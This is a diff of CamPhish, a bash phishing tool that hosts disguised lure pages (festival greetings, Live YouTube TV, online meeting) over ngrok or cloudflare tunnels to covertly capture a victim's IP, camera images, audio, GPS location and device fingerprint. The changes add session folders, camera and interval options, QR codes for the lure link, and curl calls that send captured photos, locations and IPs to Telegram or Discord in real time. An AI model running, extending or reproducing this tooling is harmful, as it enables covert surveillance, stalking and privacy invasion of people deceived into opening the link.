@@ -1,5 +1,5 @@
 #!/bin/bash
-# CamPhish v2.0
+# CamPhish v3.0
 # Powered by TechChip
 
 # Windows compatibility check
@@ -38,7 +38,7 @@ printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | 
 printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
-printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
+printf " \e[1;93m CamPhish Ver 3.0 \e[0m \n"
 printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
 
 printf "\n"
@@ -81,28 +81,28 @@ exit 1
 }
 
 catch_ip() {
-ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+ip=$(grep -a 'IP:' "$session_dir/ip.txt" | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 
-cat ip.txt >> saved.ip.txt
+cat "$session_dir/ip.txt" >> "$session_dir/saved.ip.txt"
 }
 
 catch_location() {
   # First check for the current_location.txt file which is always created
-  if [[ -e "current_location.txt" ]]; then
+  if [[ -e "$session_dir/current_location.txt" ]]; then
     printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Current location data:\e[0m\n"
     # Filter out unwanted messages before displaying
-    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
+    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" "$session_dir/current_location.txt"
     printf "\n"
     
     # Move it to a backup to avoid duplicate display
-    mv current_location.txt current_location.bak
+    mv "$session_dir/current_location.txt" "$session_dir/current_location.bak"
   fi
 
   # Then check for any location_* files
-  if [[ -e "location_"* ]]; then
-    location_file=$(ls location_* | head -n 1)
+  if [[ -e "$session_dir/location_"* ]]; then
+    location_file=$(ls "$session_dir"/location_* | head -n 1)
     lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
     lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
     acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
@@ -114,63 +114,211 @@ catch_location() {
     printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" $acc
     printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
     
-    # Create directory for saved locations if it doesn't exist
-    if [[ ! -d "saved_locations" ]]; then
-      mkdir -p saved_locations
-    fi
-    
-    mv "$location_file" saved_locations/
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
+    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to %s\e[0m\n" "$location_file"
+
+    # Send notification with location data
+    send_notification "📍 Location Captured
+Latitude: $lat
+Longitude: $lon
+Accuracy: $acc meters
+Google Maps: $maps_link"
   else
     printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
-    
-    # Don't display any debug logs to avoid showing unwanted messages
   fi
 }
 
-checkfound() {
-# Create directory for saved locations if it doesn't exist
-if [[ ! -d "saved_locations" ]]; then
-  mkdir -p saved_locations
+# ─────────────────────────────────────────────
+# Session management
+# ─────────────────────────────────────────────
+create_session() {
+session_dir="sessions/$(date +%Y%m%d_%H%M%S)_$$"
+mkdir -p "$session_dir"
+echo "$session_dir" > session_dir.txt
+printf "\e[1;92m[\e[0m+\e[1;92m] Session directory:\e[0m\e[1;77m %s\e[0m\n" "$session_dir"
+}
+
+# ─────────────────────────────────────────────
+# Camera mode selection
+# ─────────────────────────────────────────────
+select_camera_mode() {
+printf "\n-----Choose camera mode----\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Front camera (user)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Rear camera (environment)\e[0m\n"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose camera mode: [Default is 1] \e[0m' option_cam
+option_cam="${option_cam:-1}"
+if [[ $option_cam -eq 2 ]]; then
+  cam_facing_mode="environment"
+else
+  cam_facing_mode="user"
 fi
+printf "\e[1;92m[\e[0m*\e[1;92m] Camera mode:\e[0m\e[1;77m %s\e[0m\n" "$cam_facing_mode"
+}
+
+# ─────────────────────────────────────────────
+# Capture interval selection
+# ─────────────────────────────────────────────
+select_capture_interval() {
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Capture interval in ms (min 500): [Default is 1500] \e[0m' option_interval
+option_interval="${option_interval:-1500}"
+if [[ ! "$option_interval" =~ ^[0-9]+$ ]] || [[ "$option_interval" -lt 500 ]]; then
+  printf "\e[1;93m [!] Invalid interval, using 1500 ms\e[0m\n"
+  option_interval=1500
+fi
+cam_interval_ms="$option_interval"
+printf "\e[1;92m[\e[0m*\e[1;92m] Capture interval:\e[0m\e[1;77m %s ms\e[0m\n" "$cam_interval_ms"
+}
+
+# ─────────────────────────────────────────────
+# Custom page title and favicon
+# ─────────────────────────────────────────────
+get_custom_title_favicon() {
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Custom page title (leave blank for default): \e[0m' custom_page_title
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Custom favicon URL (leave blank for none): \e[0m' custom_favicon_url
+}
+
+# ─────────────────────────────────────────────
+# QR code generation
+# ─────────────────────────────────────────────
+generate_qr() {
+local url="$1"
+printf "\n\e[1;92m[\e[0m*\e[1;92m] QR Code for the link:\e[0m\n"
+if command -v qrencode > /dev/null 2>&1; then
+  qrencode -t ANSIUTF8 -o - "$url" 2>/dev/null
+else
+  printf "\e[1;93m[\e[0m!\e[1;93m] Install 'qrencode' for terminal QR display (apt install qrencode)\e[0m\n"
+  printf "\e[1;93m[\e[0m*\e[1;93m] Generate QR online: https://qr.io/?url=%s\e[0m\n" "$url"
+fi
+printf "\n"
+}
+
+# ─────────────────────────────────────────────
+# Notification setup and dispatch
+# ─────────────────────────────────────────────
+setup_notifications() {
+printf "\n-----Notification settings----\n"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enable real-time notifications? [y/N]: \e[0m' enable_notif
+if [[ "$enable_notif" == "y" || "$enable_notif" == "Y" ]]; then
+  printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Telegram\e[0m\n"
+  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Discord\e[0m\n"
+  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose notification type: \e[0m' option_notif
+  if [[ $option_notif -eq 1 ]]; then
+    notif_type="telegram"
+    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Telegram Bot Token: \e[0m' telegram_token
+    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Telegram Chat ID: \e[0m' telegram_chat_id
+    printf "\e[1;92m[\e[0m*\e[1;92m] Telegram notifications enabled\e[0m\n"
+  elif [[ $option_notif -eq 2 ]]; then
+    notif_type="discord"
+    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Discord Webhook URL: \e[0m' discord_webhook
+    printf "\e[1;92m[\e[0m*\e[1;92m] Discord notifications enabled\e[0m\n"
+  else
+    notif_type=""
+    printf "\e[1;93m[\e[0m!\e[1;93m] Invalid choice, notifications disabled\e[0m\n"
+  fi
+else
+  notif_type=""
+fi
+}
+
+send_notification() {
+local message="$1"
+local photo_file="${2:-}"
+
+if [[ -z "$notif_type" ]]; then
+  return
+fi
+
+if [[ "$notif_type" == "telegram" ]]; then
+  if [[ -n "$photo_file" && -f "$photo_file" ]]; then
+    curl -s -X POST "https://api.telegram.org/bot${telegram_token}/sendPhoto" \
+      -F "chat_id=${telegram_chat_id}" \
+      -F "photo=@${photo_file}" \
+      -F "caption=${message}" > /dev/null 2>&1 &
+  else
+    curl -s -X POST "https://api.telegram.org/bot${telegram_token}/sendMessage" \
+      --data-urlencode "chat_id=${telegram_chat_id}" \
+      --data-urlencode "text=${message}" > /dev/null 2>&1 &
+  fi
+elif [[ "$notif_type" == "discord" ]]; then
+  if [[ -n "$photo_file" && -f "$photo_file" ]]; then
+    curl -s -X POST "${discord_webhook}" \
+      -F "payload_json={\"content\": \"$(printf '%s' "$message" | sed 's/"/\\"/g')\"}" \
+      -F "file=@${photo_file}" > /dev/null 2>&1 &
+  else
+    local escaped
+    # Escape for JSON string value: backslash, double-quote, then common control chars
+    escaped=$(printf '%s' "$message" | sed 's/\\/\\\\/g; s/"/\\"/g; s/	/\\t/g' | awk '{printf "%s\\n", $0}' | head -c -2)
+    curl -s -X POST "${discord_webhook}" \
+      -H "Content-Type: application/json" \
+      -d "{\"content\": \"${escaped}\"}" > /dev/null 2>&1 &
+  fi
+fi
+}
+
+checkfound() {
 
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Session directory:\e[0m\e[1;77m %s\e[0m\n" "$session_dir"
 while [ true ]; do
 
-if [[ -e "ip.txt" ]]; then
+if [[ -e "$session_dir/ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 catch_ip
-rm -rf ip.txt
+send_notification "🎯 Target opened the link!
+IP: $(grep -a 'IP:' "$session_dir/ip.txt" | cut -d ' ' -f2 | tr -d '\r' | head -n1)"
+rm -rf "$session_dir/ip.txt"
 fi
 
 sleep 0.5
 
+# Check for fingerprint data
+if [[ -e "$session_dir/FingerprintLog.log" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Device fingerprint received!\e[0m\n"
+if [[ -e "$session_dir/fingerprint.txt" ]]; then
+  tail -n 10 "$session_dir/fingerprint.txt"
+fi
+rm -rf "$session_dir/FingerprintLog.log"
+fi
+
 # Check for current_location.txt first (our new immediate indicator)
-if [[ -e "current_location.txt" ]]; then
+if [[ -e "$session_dir/current_location.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
 catch_location
 fi
 
 # Also check for LocationLog.log (the original indicator)
-if [[ -e "LocationLog.log" ]]; then
+if [[ -e "$session_dir/LocationLog.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
-# Don't display the raw log content, just process it
 catch_location
-rm -rf LocationLog.log
+rm -rf "$session_dir/LocationLog.log"
 fi
 
-# Don't display error logs to avoid showing unwanted messages
-if [[ -e "LocationError.log" ]]; then
-# Just remove the file without displaying its contents
-rm -rf LocationError.log
+# Silently discard error logs
+if [[ -e "$session_dir/LocationError.log" ]]; then
+rm -rf "$session_dir/LocationError.log"
 fi
 
-if [[ -e "Log.log" ]]; then
+if [[ -e "$session_dir/Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
-rm -rf Log.log
+latest_cam=$(ls -t "$session_dir"/cam*.png 2>/dev/null | head -n 1)
+if [[ -n "$latest_cam" ]]; then
+  printf "\e[1;92m[\e[0m*\e[1;92m] Saved:\e[0m\e[1;77m %s\e[0m\n" "$latest_cam"
+  send_notification "📷 Camera snapshot captured" "$latest_cam"
 fi
+rm -rf "$session_dir/Log.log"
+fi
+
+if [[ -e "$session_dir/AudioLog.log" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio file received!\e[0m\n"
+latest_audio=$(ls -t "$session_dir"/audio*.webm 2>/dev/null | head -n 1)
+if [[ -n "$latest_audio" ]]; then
+  printf "\e[1;92m[\e[0m*\e[1;92m] Saved:\e[0m\e[1;77m %s\e[0m\n" "$latest_audio"
+fi
+send_notification "🎙️ Audio snippet captured: $(basename "$latest_audio")"
+rm -rf "$session_dir/AudioLog.log"
+fi
+
 sleep 0.5
 
 done 
@@ -285,23 +433,59 @@ exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
+generate_qr "$link"
 payload_cloudflare
 checkfound
 }
 
 payload_cloudflare() {
 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
-sed 's+forwarding_link+'$link'+g' template.php > index.php
-if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
-sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+generate_payload
+}
+
+generate_payload() {
+# Set defaults for new placeholders if not provided
+local title="${custom_page_title}"
+local favicon="${custom_favicon_url}"
+local facing="${cam_facing_mode:-user}"
+local interval="${cam_interval_ms:-1500}"
+
+# Default titles per template
+if [[ -z "$title" ]]; then
+  if [[ $option_tem -eq 1 ]]; then
+    title="Happy ${fest_name} to Your Friends"
+  elif [[ $option_tem -eq 2 ]]; then
+    title="Live YouTube TV"
+  else
+    title="Online Meeting"
+  fi
 fi
-rm -rf index3.html
+
+sed "s+forwarding_link+${link}+g" template.php \
+  | sed "s+page_title_placeholder+${title}+g" \
+  | sed "s+favicon_url_placeholder+${favicon}+g" > index.php
+
+if [[ $option_tem -eq 1 ]]; then
+  sed "s+forwarding_link+${link}+g" festivalwishes.html \
+    | sed "s+fes_name+${fest_name}+g" \
+    | sed "s+cam_facing_mode+${facing}+g" \
+    | sed "s+cam_interval_ms+${interval}+g" \
+    | sed "s+page_title_placeholder+${title}+g" \
+    | sed "s+favicon_url_placeholder+${favicon}+g" > index2.html
+elif [[ $option_tem -eq 2 ]]; then
+  sed "s+forwarding_link+${link}+g" LiveYTTV.html \
+    | sed "s+live_yt_tv+${yt_video_ID}+g" \
+    | sed "s+cam_facing_mode+${facing}+g" \
+    | sed "s+cam_interval_ms+${interval}+g" \
+    | sed "s+page_title_placeholder+${title}+g" \
+    | sed "s+favicon_url_placeholder+${favicon}+g" > index2.html
+else
+  sed "s+forwarding_link+${link}+g" OnlineMeeting.html \
+    | sed "s+cam_facing_mode+${facing}+g" \
+    | sed "s+cam_interval_ms+${interval}+g" \
+    | sed "s+page_title_placeholder+${title}+g" \
+    | sed "s+favicon_url_placeholder+${favicon}+g" > index2.html
+fi
 }
 
 ngrok_server() {
@@ -441,29 +625,22 @@ exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
+generate_qr "$link"
 payload_ngrok
 checkfound
 }
 
 payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
-sed 's+forwarding_link+'$link'+g' template.php > index.php
-if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
-sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
-fi
-rm -rf index3.html
+generate_payload
 }
 
 camphish() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
+
+create_session
 
 printf "\n-----Choose tunnel server----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
@@ -472,6 +649,7 @@ default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 select_template
+setup_notifications
 
 if [[ $option_server -eq 2 ]]; then
 cloudflare_tunnel
@@ -512,6 +690,9 @@ printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
 sleep 1
 select_template
 fi
+select_camera_mode
+select_capture_interval
+get_custom_title_favicon
 fi
 }
 
